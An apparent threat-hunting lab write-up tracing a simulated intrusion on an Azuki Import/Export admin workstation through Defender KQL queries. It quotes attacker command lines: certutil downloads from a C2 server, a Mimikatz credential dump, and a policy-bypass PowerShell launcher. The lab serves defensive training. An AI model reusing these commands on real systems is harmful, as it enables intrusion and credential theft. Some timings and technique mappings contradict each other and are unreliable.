# Azuki-Series-Port-of-Entry

# 🔴 Incident Brief — Azuki Import/Export 梓貿易株式会社

---

## Situation

A competitor undercut Azuki's **6-year shipping contract by exactly 3%**. Internal supplier contracts and pricing data have reportedly appeared on **underground forums**, indicating a likely data breach.

---

## Company Profile

| Field | Details |
|---|---|
| **Name** | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| **Size** | 23 employees |
| **Operations** | Shipping logistics — Japan / Southeast Asia |

---

## Compromised Systems

| Host | Role |
|---|---|
| `AZUKI-SL` | IT admin workstation |

---

## Evidence Available

- Microsoft Defender for Endpoint logs

---

## Investigation Questions

1. **Initial access** — How did the attacker gain entry?
2. **Compromised accounts** — Which accounts were accessed or hijacked?
3. **Data stolen** — What data was exfiltrated, and what is its scope?
4. **Exfiltration method** — How was the data removed from the network?
5. **Persistent access** — Does the attacker still have a foothold?

---
<br><br><br>
# Query 1: Initial Access — Remote Access Source

A KQL query was executed against `DeviceLogonEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl` and filtering for logon activity
originating from external IP addresses. 

---

## Key Findings

The results confirm that **azuki-sl** was the affected device, under account **kenji.sato**.
Four logon events were recorded within the incident window, all originating from the same
external IP address `88.97.178.12`, with the first successful logon establishing initial
access at `6:36:18 PM UTC on November 19, 2025`.

<img width="2387" height="654" alt="image" src="https://github.com/user-attachments/assets/8f5239da-9e55-48ba-aab0-eaef124e7168" />

---

## Logon Event Sequence

The first event at `6:36:18 PM UTC` shows a **LogonSuccess** action from remote device
**sanc-main** at IP `88.97.178.12` under account **kenji.sato**. This is the confirmed
point of initial access — an authenticated RDP session established from an external host
directly onto the IT admin workstation.

The account `kenji.sato` is an IT administrator account. Compromise of this account
at the point of initial access would have granted the attacker elevated privileges
across the environment from the outset, without requiring any post-exploitation
privilege escalation steps.


**MITRE ATT&CK:** `T1078` — Valid Accounts  
**MITRE ATT&CK:** `T1078.002` — Valid Accounts: Domain Accounts *(credential compromise of kenji.sato)*  
**MITRE ATT&CK:** `T1021.001` — Remote Services: Remote Desktop Protocol

---
<br><br><br>
# Query 2: Discovery — Network Reconnaissance

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl` under the compromised account
`kenji.sato`. The query filtered for network enumeration utilities launched via `cmd.exe`
or `powershell.exe` after the confirmed initial access time of 6:36 PM UTC. The goal was
to identify reconnaissance activity consistent with an attacker mapping the local network
topology as a preparatory step before lateral movement or data collection.

---

## Key Findings

The results confirm that **azuki-sl** was the affected device, under the compromised account
**kenji.sato**. One network reconnaissance event was recorded at
`7:04:01 PM UTC on November 19, 2025`, initiated by **powershell.exe** with the command
`"ARP.EXE" -a`.

<img width="1197" height="398" alt="image" src="https://github.com/user-attachments/assets/88e9f93f-77be-4fad-a051-a2ee84962acb" />

---

## Reconnaissance Activity

The event at `7:04:01 PM UTC` — approximately **28 minutes after initial RDP access** —
shows **powershell.exe** executing `"ARP.EXE" -a` under account **kenji.sato** on device
**azuki-sl**.

`arp -a` reads the local ARP cache, returning a table of every IP address and corresponding
MAC address the host has recently communicated with. This reveals which devices are active
on the local network without sending a single new packet — making it a completely passive
and silent operation from a network monitoring perspective.

Running this command from the IT admin workstation is particularly significant. Admin
workstations communicate with a far wider range of devices than standard endpoints —
servers, network infrastructure, printers, and other workstations — meaning the ARP
cache on `azuki-sl` would expose a substantially richer map of the Azuki network than
the same command run from a regular user machine.

**MITRE ATT&CK:** `T1016` — System Network Configuration Discovery  
**MITRE ATT&CK:** `T1049` — System Network Connections Discovery

---
<br><br><br>
# Query 3: Defence Evasion — Malware Staging Directory

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered `ProcessCommandLine`
for directory creation and attribute modification commands — specifically `mkdir`, `new-item`,
and `attrib` — executed after initial access. The goal was to identify a hidden staging
directory consistent with an attacker establishing a concealed location to store tools
and collected data ahead of exfiltration.

---

## Key Findings

The results confirm that **azuki-sl** was the affected device. One defence evasion event
was recorded at `7:05:33 PM UTC on November 19, 2025`, originating from
`C:\Windows\System32\attrib.exe` with the command `"attrib.exe" +h +s C:\ProgramData\WindowsCache`.

<img width="914" height="462" alt="image" src="https://github.com/user-attachments/assets/91ffe6b5-1a9c-4ce1-a2b4-60bcae530e8d" />

---

## Staging and Concealment Activity

The event at `7:05:33 PM UTC` — approximately **90 seconds after the ARP reconnaissance
command** at 7:04:01 PM — shows `attrib.exe` being used to apply hidden and system
attributes to the directory `C:\ProgramData\WindowsCache`.

The two flags applied have distinct effects:

- **`+h`** sets the Hidden attribute, removing the folder from Windows Explorer and
standard directory listings. A user browsing the filesystem will not see it under
default settings.
- **`+s`** sets the System attribute, providing a second layer of concealment. Even
with "show hidden files" enabled in Explorer, system-attributed items remain invisible
by default. It also causes the directory to appear as a legitimate Windows system
resource if discovered.

The chosen path `C:\ProgramData\WindowsCache` is deliberate. `C:\ProgramData` is a
legitimate Windows directory present on every system, commonly overlooked during
manual investigations. The subdirectory name `WindowsCache` mimics the naming
convention of genuine Windows components, providing plausible deniability if the
folder is noticed during a cursory inspection.

**MITRE ATT&CK:** `T1074.001` — Data Staged: Local Data Staging  
**MITRE ATT&CK:** `T1564.001` — Hide Artefacts: Hidden Files and Directories

---
<br><br><br>
# Query 4: Defence Evasion — Windows Defender Extension Exclusions

A KQL query was executed against `DeviceRegistryEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered `RegistryKey`
for modifications to Windows Defender's `Exclusions` path, projecting `RegistryValueName`
to identify which file extensions were added. The goal was to determine the scope of the
attacker's effort to blind Windows Defender against scanning their tools and staged files.

---

## Key Findings

The results confirm **3 file extension exclusions** were added to Windows Defender on
**azuki-sl** within a two-second window at `6:49 PM UTC on November 19, 2025` — just
minutes after the staging directory `C:\ProgramData\WindowsCache` was created and hidden.

<img width="880" height="508" alt="image" src="https://github.com/user-attachments/assets/ff1f3ffe-d95e-44c0-a6d3-cab972abbc21" />

---

## Exclusions Added

| TimeGenerated [UTC] | RegistryValueName | Purpose |
|---|---|---|
| 11/19/2025, 6:49:27 PM | `.bat` | Batch scripts — command execution and automation |
| 11/19/2025, 6:49:27 PM | `.ps1` | PowerShell scripts — the attacker's primary tooling language |
| 11/19/2025, 6:49:29 PM | `.exe` | Executables — covers any dropped malware or tools |

**MITRE ATT&CK:** `T1562.001` — Impair Defenses: Disable or Modify Tools

---
<br><br><br>
# Query 5: Defence Evasion — Download Utility Abuse

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered `ProcessCommandLine`
for network download indicators including `http`, `certutil`, `bitsadmin`, `wget`, and
`Invoke-WebRequest` — native Windows utilities commonly weaponised to pull remote files
without triggering standard security controls. The goal was to identify Living Off The Land
Binary (LOLBin) abuse used to deliver malicious tools into the hidden staging directory.

---

## Key Findings

The results confirm **two malicious file downloads** were executed on **azuki-sl** within
23 seconds of each other between `7:06:58 PM` and `7:07:21 PM UTC on November 19, 2025`.
Both downloads were performed using **certutil.exe** and initiated by a PowerShell script
`wupdate.ps1` running under the compromised account **kenji.sato**. Both files were
downloaded directly into the hidden staging directory `C:\ProgramData\WindowsCache`.

<img width="2052" height="329" alt="image" src="https://github.com/user-attachments/assets/00171708-0b93-4b99-b1f8-b18911c70259" />

---

## Download Events

The first event at `7:06:58 PM UTC` shows **certutil.exe** executing:
```
"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe
```
This downloaded a file named `svchost.exe` from the attacker's command and control server
at `78.141.196.6:8080`, saving it directly into the hidden staging directory as `svchost.exe`
— deliberately named to impersonate the legitimate Windows system process.

The second event at `7:07:21 PM UTC` shows **certutil.exe** executing:
```
"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe
```
This downloaded a file named `AdobeGC.exe` from the same attacker server, saving it into
the staging directory as `mm.exe`. The rename from `AdobeGC.exe` to `mm.exe` is a strong
indicator this is **Mimikatz** — a credential harvesting tool — consistent with the
`mm.exe` Defender exclusion added earlier at `7:45 PM UTC`.

Both downloads were initiated by:
```
"powershell.exe" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1
```

**MITRE ATT&CK:** `T1197` — BITS Jobs  
**MITRE ATT&CK:** `T1105` — Ingress Tool Transfer  
**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell  
**MITRE ATT&CK:** `T1036.005` — Masquerading: Match Legitimate Name or Location *(svchost.exe, wupdate.ps1)*

---
<br><br><br>
# Query 6: Persistence — Scheduled Task Creation

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered for executions
of `schtasks.exe` — the native Windows scheduled task utility — to identify persistence
mechanisms established by the attacker after deploying their tooling into the hidden staging
directory. The goal was to determine whether the attacker had secured a means of surviving
a reboot or session termination.

---

## Key Findings

The results confirm a scheduled task was created on **azuki-sl** at
`7:07:46 PM UTC on November 19, 2025` — just **25 seconds after the second malicious
file download completed**. The task was verified with a query command 6 seconds later
at `7:07:52 PM UTC`, confirming successful registration.

<img width="1429" height="315" alt="image" src="https://github.com/user-attachments/assets/c496cd6d-480f-4f3b-b01e-7f4c1ede3422" />

---

## Analysis

The task name **"Windows Update Check"** is deliberately chosen to blend in with
legitimate Windows scheduled tasks. An administrator performing a cursory review of
the task scheduler would see a plausible-looking maintenance task and be unlikely
to investigate further.

The task runs `C:\ProgramData\WindowsCache\svchost.exe` — the malicious binary
downloaded via `certutil.exe` in the previous stage, itself named to impersonate
the legitimate Windows `svchost.exe` process. The attacker has layered two levels
of masquerading: a convincing task name and a convincing executable name.

Scheduling execution at **02:00 AM daily** is a deliberate choice. This window
corresponds to minimal user and administrator activity, reducing the likelihood
of the process being noticed in task manager or triggering an alert response.

Most critically, the task runs as **SYSTEM** — granting the malicious executable
the highest privilege level available on the host, with unrestricted access to
all files, processes, registry keys, and network resources on `azuki-sl`.

**MITRE ATT&CK:** `T1053.005` — Scheduled Task/Job: Scheduled Task  
**MITRE ATT&CK:** `T1036.005` — Masquerading: Match Legitimate Name or Location *(Windows Update Check, svchost.exe)*  
**MITRE ATT&CK:** `T1078.003` — Valid Accounts: Local Accounts *(SYSTEM privilege abuse)*

---
<br><br><br>
# Query 7: Credential Access — Memory Extraction Module

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered for executions
of `mm.exe` — the Mimikatz credential dumping tool downloaded from the attacker's C2 server
in the previous stage. The goal was to identify the exact Mimikatz module and command used
to extract credentials from memory, confirming the scope of credential compromise across
the Azuki environment.

---

## Key Findings

The results confirm **mm.exe was executed** on **azuki-sl** at `7:08:26 PM UTC on
November 19, 2025` — just **65 seconds after the persistence scheduled task was created**.
The full command line reveals the exact Mimikatz invocation used to extract credentials
from Windows memory.

<img width="1327" height="526" alt="image" src="https://github.com/user-attachments/assets/19bc3a83-948c-4f84-b27e-6d0973f67836" />

---

## Credential Dumping Command

At `7:08:26 PM UTC`, the following command was executed:

```
"mm.exe" privilege::debug sekurlsa::logonpasswords exit
```
---

## Analysis

**`privilege::debug`** is always the first Mimikatz command in a credential dumping
sequence. Without SeDebugPrivilege, Mimikatz cannot read LSASS process memory. Running
as SYSTEM — which the attacker achieved via the compromised `kenji.sato` admin account
— means this privilege is available and granted immediately.

**`sekurlsa::logonpasswords`** interfaces directly with LSASS (`lsass.exe`) — the
Windows process responsible for authentication — and extracts every credential currently
cached in memory. This includes:

- Plaintext passwords for any interactively logged-on accounts
- NTLM hashes usable for pass-the-hash attacks without needing the plaintext password
- Kerberos tickets usable for pass-the-ticket lateral movement
- Cached domain credentials for any account that has authenticated on this machine

On an IT admin workstation like `azuki-sl`, the LSASS cache is likely to contain
credentials for multiple accounts beyond `kenji.sato` — including other administrators
and potentially domain-level accounts, significantly widening the blast radius of
this single credential dump.


**MITRE ATT&CK:** `T1003.001` — OS Credential Dumping: LSASS Memory  
**MITRE ATT&CK:** `T1134.001` — Access Token Manipulation: Token Impersonation *(privilege::debug)*  
**MITRE ATT&CK:** `T1550.002` — Use Alternate Authentication Material: Pass the Hash

---
<br><br><br>
# Query 8: Collection — Data Staging Archive

A KQL query was executed against `DeviceFileEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered for zip file
creation and modification events to identify data archiving activity consistent with an
attacker compressing collected files ahead of exfiltration. The goal was to locate the
staging archive created in the hidden `WindowsCache` directory.

---

## Key Findings

The results confirm a zip archive named **export-data.zip** was created inside the hidden
staging directory at `7:08:58 PM UTC on November 19, 2025` — just **32 seconds after
Mimikatz completed credential dumping**. The archive was created directly inside
`C:\ProgramData\WindowsCache`, the attacker's concealed staging location.

<img width="1357" height="578" alt="image" src="https://github.com/user-attachments/assets/d1500973-8805-4e04-a9e5-3cea66df0dfb" />

---

## Staging Archive Created

At `7:08:58 PM UTC`, the following file creation event was recorded:

| Field | Value |
|---|---|
| **FileName** | `export-data.zip` |
| **FolderPath** | `C:\ProgramData\WindowsCache\export-data.zip` |
| **ActionType** | `FileCreated` |
| **TimeGenerated** | 11/19/2025, 7:08:58 PM UTC |

The archive was created inside `C:\ProgramData\WindowsCache` — the same hidden,
system-attributed directory established earlier in the attack. With Defender exclusions
for `.exe`, `.ps1`, and `.bat` already in place, the contents of this directory
were shielded from scanning at the time of archive creation.

---

## Analysis

The name **export-data.zip** is unambiguous — the attacker made no attempt to disguise
the purpose of this archive. Its creation 32 seconds after `sekurlsa::logonpasswords`
completed suggests the archive was assembled programmatically as the final step of a
scripted collection routine, immediately packaging whatever data and credentials had
been gathered during the intrusion.

The location inside `C:\ProgramData\WindowsCache` is deliberate. The directory was
hidden with `attrib +h +s` over three minutes earlier at `7:05 PM UTC`, meaning
`export-data.zip` was created in a folder invisible to standard filesystem browsing.
Combined with the `.zip` extension not being covered by the Defender exclusions,
the attacker relied on the directory's hidden status rather than AV evasion to
conceal the archive.

This file represents the **collection point** for everything the attacker gathered
— likely including credentials dumped by Mimikatz, any documents or files accessed
during the session, and potentially configuration data from the IT admin workstation.

**MITRE ATT&CK:** `T1074.001` — Data Staged: Local Data Staging  
**MITRE ATT&CK:** `T1560.001` — Archive Collected Data: Archive via Utility

---
<br><br><br>
# Query 9: Exfiltration — Discord as Exfiltration Channel

A KQL query was executed against `DeviceNetworkEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered for outbound
network connections to Discord URLs initiated via HTTPS, to identify whether the attacker
used Discord's file sharing infrastructure as a covert exfiltration channel. The goal was
to confirm whether `export-data.zip` was successfully transmitted out of the Azuki network.

---

## Key Findings

The results confirm a **successful outbound connection to discord.com** was made from
**azuki-sl** at `7:09:21 PM UTC on November 19, 2025` — just **23 seconds after
export-data.zip was created** in the staging directory. The connection was initiated
by **curl.exe** and successfully transmitted data to Discord's infrastructure over
port 443.

<img width="1616" height="342" alt="image" src="https://github.com/user-attachments/assets/019eceab-7047-469a-b139-454101ced29e" />
---


## Analysis

**Discord as an exfiltration channel** is an increasingly common attacker technique
for several reasons:

- Discord traffic over port 443 is **indistinguishable from normal HTTPS** at the
network level — it blends in with everyday web traffic
- Discord is a **legitimate, widely used platform** that most organisations do not
block at the firewall, making outbound connections to `discord.com` unremarkable
- Discord **webhooks** allow anyone to POST files and messages to a private channel
programmatically with a single curl command — no authentication UI, no login required
- Files uploaded to Discord are hosted on Discord's CDN and accessible to the attacker
from anywhere in the world via a private link

**`curl.exe`** is a native Windows binary available on all modern Windows systems,
requiring no download and raising no alerts by process name alone. Its use here is
another Living Off The Land technique — the attacker exfiltrated data using a tool
that ships with the operating system.

The connection to `162.159.135.232` on port `443` resolves to Discord's content
delivery infrastructure, confirming this was a genuine Discord upload rather than
a spoofed domain.

**MITRE ATT&CK:** `T1048.003` — Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol  
**MITRE ATT&CK:** `T1567.002` — Exfiltration Over Web Service: Exfiltration to Cloud Storage  
**MITRE ATT&CK:** `T1105` — Ingress Tool Transfer *(curl.exe as LOLBin)*

---
<br><br><br>
# Query 10: Anti-Forensics — Log Tampering

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered `ProcessCommandLine`
for executions of `wevtutil.exe` — the native Windows event log management utility — excluding
system-initiated processes to isolate attacker-driven log clearing activity. Results were
sorted ascending by `TimeGenerated` to establish the order in which logs were wiped. The goal
was to identify which Windows event logs were destroyed and in what sequence as part of the
attacker's anti-forensics cleanup routine.

---

## Key Findings

The results confirm **three Windows event logs were cleared** on **azuki-sl** within a
seven-second window between `7:11:39 PM` and `7:11:46 PM UTC on November 19, 2025`.
All three clearing commands were initiated by the same PowerShell script observed
throughout the intrusion. The logs were cleared in the following order:

1. `Security` — cleared first at `7:11:39 PM UTC`
2. `System` — cleared second at `7:11:43 PM UTC`
3. `Application` — cleared third at `7:11:46 PM UTC`

<img width="1056" height="415" alt="image" src="https://github.com/user-attachments/assets/cd3518ec-ecdf-4a05-a815-2451d61168ed" />

---

## What Was Destroyed

**Security log** — cleared first and prioritised above all others. This log contained
every logon event, failed authentication attempt, privilege escalation, and account
activity recorded during the intrusion. The RDP logon by `kenji.sato`, the
`privilege::debug` request by Mimikatz, and every subsequent authenticated action
would have been recorded here. Clearing this log was the attacker's highest priority.

**System log** — cleared second. This log recorded service starts and stops, driver
loads, and system-level changes made during the intrusion window — including any
records of the scheduled task registration and Defender configuration changes that
generated system events.

**Application log** — cleared third. This log captured application-level activity
including any Defender detections, application crashes, and software events generated
during the attacker's tooling execution.


**MITRE ATT&CK:** `T1070.001` — Indicator Removal: Clear Windows Event Logs  
**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell

---
<br><br><br>
# Query 11: Impact — Persistence Account Creation

A KQL query was executed against `DeviceProcessEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered `ProcessCommandLine`
for `net.exe` user account creation and group membership commands to identify whether the
attacker established a backdoor account for persistent access independent of the compromised
`kenji.sato` credentials. Results were sorted ascending by `TimeGenerated` to establish
the creation sequence.

---

## Key Findings

The results confirm a **backdoor local account named `support` was created** on **azuki-sl**
at `7:09:48 PM UTC on November 19, 2025` and immediately added to the local **Administrators**
group at `7:09:53 PM UTC` — five seconds later. All four commands were initiated by
**powershell.exe** as part of the same automated script observed throughout the intrusion.

<img width="1058" height="417" alt="image" src="https://github.com/user-attachments/assets/ca1540a6-7185-4692-ae0f-39821c798c4d" />

---

## Analysis

The account name **`support`** is deliberately chosen to appear as a legitimate
helpdesk or IT support account. On a system belonging to a 23-person company with
an IT admin workstation, a local account named `support` would not immediately
raise suspicion during a routine user audit.

The password applied at creation — redacted in the screenshot but captured in full
in Defender telemetry — gives the attacker a set of credentials entirely independent
of `kenji.sato`. Even if `kenji.sato` is disabled, credentials are reset, and the
RDP session is terminated, the `support` account provides the attacker with a
fully functional, password-authenticated local administrator account on `azuki-sl`.

The appearance of **`net1`** alongside each `net.exe` command is expected behaviour
— Windows internally calls `net1.exe` as a subprocess whenever `net.exe` is executed,
meaning each user creation and group assignment generated two process events. This
is normal Windows behaviour, not a sign of additional attacker activity.

Adding `support` to the **local Administrators group** immediately after creation
means the account has full unrestricted access to `azuki-sl` — equivalent in
privilege to `kenji.sato` and capable of re-establishing RDP access, re-deploying
tools, and re-accessing all files on the device.

**MITRE ATT&CK:** `T1136.001` — Create Account: Local Account  
**MITRE ATT&CK:** `T1098` — Account Manipulation  
**MITRE ATT&CK:** `T1078.003` — Valid Accounts: Local Accounts

---
<br><br><br>
# Query 12: Lateral Movement — Secondary Target

A KQL query was executed against `DeviceNetworkEvents` for the November 19–20, 2025 timeframe,
targeting the compromised IT admin workstation `azuki-sl`. The query filtered
`InitiatingProcessCommandLine` for `mstsc.exe` and `cmdkey` — the native Windows RDP client
and credential manager utility — to identify whether the attacker used `azuki-sl` as a
pivot point to move laterally to other machines on the Azuki internal network. Results
were sorted ascending by `TimeGenerated` to establish the sequence of lateral movement.

---

## Key Findings

The results confirm **one successful RDP lateral movement event** from **azuki-sl** to
an internal host at `7:10:42 PM UTC on November 19, 2025` — **34 minutes after initial
access** and **2 minutes after the `support` backdoor account was created**. The connection
was made using `mstsc.exe` directly targeting `10.1.0.188` over port `3389`.

<img width="1359" height="325" alt="image" src="https://github.com/user-attachments/assets/bad9a358-f3f5-4716-8782-8881af2e035c" />

---

## Analysis

The command `"mstsc.exe" /v:10.1.0.188` is a direct, deliberate RDP connection to a
specific internal host. The `/v:` flag specifies the exact target — this was not a
background or incidental connection but a purposeful pivot to a named internal machine.

The target `10.1.0.188` sits within the same `10.1.0.0/24` subnet as `azuki-sl`.
This subnet would have been fully mapped by the `arp -a` reconnaissance command
executed at `7:04 PM` — 6 minutes before this lateral movement event — confirming
that network reconnaissance directly informed the attacker's choice of secondary target.

The connection succeeded over **port 3389**, confirming that RDP is permitted between
internal hosts on the Azuki network and that the attacker possessed valid credentials
— most likely harvested from LSASS memory by Mimikatz at `7:08 PM` — sufficient to
authenticate to `10.1.0.188`.

The timing places this lateral movement as the **final offensive action** before the
attacker began their cleanup routine, clearing event logs at `7:11 PM`. Having already
exfiltrated `export-data.zip` to Discord and established persistence via both a
scheduled task and the `support` backdoor account on `azuki-sl`, the move to
`10.1.0.188` suggests the attacker was expanding their foothold across the Azuki
network beyond the initial point of compromise.


**MITRE ATT&CK:** `T1021.001` — Remote Services: Remote Desktop Protocol  
**MITRE ATT&CK:** `T1078` — Valid Accounts *(stolen credentials used for lateral movement)*  
**MITRE ATT&CK:** `T1550.002` — Use Alternate Authentication Material: Pass the Hash

---
<br><br><br>
# Incident Conclusion Part 1 — Azuki Import/Export | 梓貿易株式会社

## Summary

On November 19, 2025, an attacker gained unauthorised access to Azuki Import/Export's
IT admin workstation `azuki-sl` via an RDP connection from `88.97.178.12` using the
compromised account `kenji.sato`. Within 33 minutes the attacker executed a fully
scripted attack chain, driven by a PowerShell script `wupdate.ps1`, that covered
every stage of the intrusion lifecycle.

---

## Attack Chain

After gaining access the attacker performed network reconnaissance using `arp -a`,
created a hidden staging directory at `C:\ProgramData\WindowsCache`, and disabled
Windows Defender scanning for key file extensions. Tools including a renamed Mimikatz
binary were downloaded from a C2 server at `78.141.196.6` using `certutil.exe`.
Credentials were dumped from LSASS memory using `sekurlsa::logonpasswords`, and
collected data was archived into `export-data.zip` and exfiltrated to an
attacker-controlled Discord channel via `curl.exe`.

To ensure persistent access the attacker created a scheduled task running a malicious
`svchost.exe` as SYSTEM at 2:00 AM daily, and created a local administrator backdoor
account named `support`. Before disconnecting, all three primary Windows event logs
were wiped using `wevtutil.exe` in an attempt to destroy forensic evidence. The
attacker then moved laterally to a second internal host at `10.1.0.188` via RDP,
indicating the compromise extends beyond `azuki-sl`.

---

## Full Timeline

| Time [UTC] | Stage | Action |
|---|---|---|
| 6:36 PM | Initial Access | RDP logon from `88.97.178.12` via `kenji.sato` |
| 6:49 PM | Defence Evasion | Defender exclusions added — `.exe`, `.ps1`, `.bat` |
| 7:04 PM | Discovery | Network reconnaissance via `arp -a` |
| 7:05 PM | Defence Evasion | Staging directory hidden — `attrib +h +s` |
| 7:06 PM | Tool Transfer | Tools downloaded via `certutil.exe` from `78.141.196.6` |
| 7:07 PM | Persistence | Scheduled task `Windows Update Check` created as SYSTEM |
| 7:08 PM | Credential Access | Credentials dumped via `sekurlsa::logonpasswords` |
| 7:08 PM | Collection | Data archived into `export-data.zip` |
| 7:09 PM | Exfiltration | `export-data.zip` uploaded to Discord via `curl.exe` |
| 7:09 PM | Persistence | Backdoor account `support` added to Administrators |
| 7:10 PM | Lateral Movement | RDP connection to internal host `10.1.0.188` |
| 7:11 PM | Anti-Forensics | Security, System, and Application event logs wiped |

---

## Compromised Assets

| Asset | Type | Status |
|---|---|---|
| `azuki-sl` | IT admin workstation | Fully compromised |
| `kenji.sato` | User account | Credentials stolen |
| `support` | Backdoor account | Created by attacker — delete immediately |
| `10.1.0.188` | Internal host | Lateral movement target — investigate immediately |
| `C:\ProgramData\WindowsCache` | Staging directory | Hidden — forensically preserve |
| `export-data.zip` | Data archive | Exfiltrated — in attacker's possession |

---

## Key Indicators of Compromise

| Indicator | Type |
|---|---|
| `88.97.178.12` | Attacker source IP |
| `78.141.196.6:8080` | C2 server |
| `162.159.135.232` | Discord exfiltration endpoint |
| `C:\ProgramData\WindowsCache\` | Staging directory |
| `C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` | Attack orchestration script |
| `Windows Update Check` | Malicious scheduled task |
| `support` | Backdoor local administrator account |

---










